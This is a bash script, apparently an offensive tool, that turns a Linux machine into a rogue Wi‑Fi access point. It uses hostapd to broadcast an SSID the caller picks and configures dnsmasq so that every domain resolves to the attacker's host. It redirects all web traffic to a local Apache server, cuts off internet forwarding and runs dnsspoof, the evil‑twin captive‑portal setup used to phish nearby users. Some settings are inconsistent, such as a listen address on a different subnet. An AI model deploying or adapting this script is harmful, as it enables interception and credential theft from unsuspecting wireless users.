#!/bin/bash
# Check parameters in case print usage
if [[ $# -ne 3 ]]; then
    echo "usage: sudo captive.sh [wireless-device] [internet-access] [AP network name]"
    exit 2
fi

# Check if program is run as sudo user
if [ "$EUID" -ne 0 ]
  then echo "Please run as root: sudo captive.sh [wireless-device] [internet-access] [AP network name]"
  exit
fi
wifi="$1"
eth="$2"
PIDhostapd="/tmp/hostapd.pid"
CONFhostapd="/tmp/hostapd.conf"
CONFdnsmasq="/tmp/dnsmasq.conf"
cat <<EOF
 __      __.__  _____.__ ______ ______
/  \    /  \__|/ ____\__|  __  |  __  |
\   \/\/   /  \   __\|  | |__| | |__| |
 \        /|  ||  |  |  |  __  |  ____|
  \__/\  / |__||__|  |__|_|  |_| |
       \/                      |_|  @NF     
EOF
clean_up()
{
  	echo -en "\nClean up and exit\n"
	echo -e "Restoring hostapd.conf"
	if [ -f /etc/hostapd/hostapd.BAK ]; then mv /etc/hostapd/hostapd.BAK /etc/hostapd/hostapd.conf; fi
	echo -e "Restoring iptables"
	iptables -t nat -F
	iptables -F
	echo -e "-------> Stopping hostapd"
	kill -9 $(<"$PIDhostapd")
	echo -e "-------> Stopping dnsspoof"
	pkill dnsspoof
	echo -e "-------> Reload network configuration"
	ifconfig $wifi down
	service network-manager reload
	sleep 1
	ifconfig $wifi up
	echo -e "DONE."
  	exit
}

# Register signal handlers
trap clean_up SIGHUP SIGINT SIGTERM

# Stop processes that could cause conflicts
systemctl stop systemd-resolved
rfkill unblock all
# Ensure interface is up
ifconfig $1 up

# Set up environment and backup configuration files of both Hostapd and Dnsmasq
echo -e "Setting up environment..."
if [ -f /etc/hostapd/hostapd.conf ]; then mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.BAK; fi
echo -e "interface=$1\ndriver=nl80211\nssid=$3\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0" > "$CONFhostapd"
echo -e "interface=$1\ndhcp-range=192.168.1.2,192.168.1.250,255.255.255.0,12h\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\nserver=8.8.8.8\nlog-queries\nlisten-address=127.0.0.1\nlisten-address=192.168.12.1\naddress=/#/192.168.1.1" > "$CONFdnsmasq"

echo -e "-------> Starting hostapd"
hostapd -B "$CONFhostapd" -P "$PIDhostapd"
echo -e "Configuring $1"
ifconfig $1 192.168.1.1
echo -e "-------> Starting dnsmasq"
if [ -z "$(ps -e | grep dnsmasq)" ]
  then 
    dnsmasq -C "$CONFdnsmasq" -d
  fi
echo -e "Adding routes to iptables"
iptables --table nat --append POSTROUTING --out-interface $2 -j MASQUERADE 
iptables --append FORWARD --in-interface $1 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE
echo -e "Disabling internet access"
sysctl -w net.ipv4.ip_forward=0

echo -e "Configuring modrewrite and APACHE"
a2enmod rewrite
service apache2 reload

echo -e "-------> Starting dnsspoof"
dnsspoof -i $1 1> /dev/null
while true; do read x; done

